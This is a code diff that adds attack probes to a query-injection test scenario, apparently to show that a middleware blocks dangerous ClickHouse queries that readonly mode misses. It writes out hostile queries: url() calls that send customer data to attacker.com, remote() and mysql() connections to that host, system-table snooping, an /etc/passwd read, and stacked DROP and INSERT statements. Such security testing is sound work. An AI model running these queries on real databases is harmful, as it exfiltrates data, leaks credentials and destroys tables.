@@ -136,6 +136,69 @@ class QueryInjectionScenario(BaseScenario):
             query="SELECT * FROM file('/etc/passwd', 'TSV', 'line String')",
         )))
 
+        # --- Advanced: probes that bypass readonly=1 but middleware catches ---
+        # These demonstrate the middleware's value beyond ClickHouse's built-in
+        # readonly mode.  In baseline mode, these SUCCEED (readonly doesn't
+        # block them).  Through the middleware, they are BLOCKED by AST-level
+        # inspection of dangerous functions and system table access.
+
+        probes.append(self.execute_probe(client, AttackProbe(
+            name="url_exfil_with_data",
+            query=(
+                "SELECT * FROM url('http://attacker.com/steal?d=' || "
+                "toString(customer_id), CSV, 'a String')"
+            ),
+            metadata={"bypasses_readonly": True, "attack_class": "data_exfiltration"},
+        )))
+
+        probes.append(self.execute_probe(client, AttackProbe(
+            name="remote_server_probe",
+            query="SELECT * FROM remote('attacker.com:9000', 'system', 'one')",
+            metadata={"bypasses_readonly": True, "attack_class": "server_probing"},
+        )))
+
+        probes.append(self.execute_probe(client, AttackProbe(
+            name="s3_access",
+            query="SELECT * FROM s3('https://bucket.s3.amazonaws.com/data.csv', 'CSV', 'line String')",
+            metadata={"bypasses_readonly": True, "attack_class": "cloud_access"},
+        )))
+
+        probes.append(self.execute_probe(client, AttackProbe(
+            name="mysql_external_db",
+            query="SELECT * FROM mysql('attacker.com:3306', 'db', 'table', 'user', 'pass')",
+            metadata={"bypasses_readonly": True, "attack_class": "external_db"},
+        )))
+
+        probes.append(self.execute_probe(client, AttackProbe(
+            name="system_query_log_snoop",
+            query="SELECT user, query FROM system.query_log ORDER BY event_time DESC LIMIT 50",
+            metadata={"bypasses_readonly": True, "attack_class": "info_leakage"},
+        )))
+
+        probes.append(self.execute_probe(client, AttackProbe(
+            name="system_processes_snoop",
+            query="SELECT query_id, user, query FROM system.processes",
+            metadata={"bypasses_readonly": True, "attack_class": "info_leakage"},
+        )))
+
+        probes.append(self.execute_probe(client, AttackProbe(
+            name="system_users_snoop",
+            query="SELECT name, storage FROM system.users",
+            metadata={"bypasses_readonly": True, "attack_class": "info_leakage"},
+        )))
+
+        probes.append(self.execute_probe(client, AttackProbe(
+            name="multi_stmt_select_drop",
+            query="SELECT 1; DROP TABLE sao.customers",
+            metadata={"bypasses_readonly": True, "attack_class": "multi_statement"},
+        )))
+
+        probes.append(self.execute_probe(client, AttackProbe(
+            name="multi_stmt_select_insert",
+            query="SELECT 1; INSERT INTO sao.customers VALUES (0, 'x')",
+            metadata={"bypasses_readonly": True, "attack_class": "multi_statement"},
+        )))
+
         return ScenarioResult(
             scenario_name=self.name,
             description=self.description,
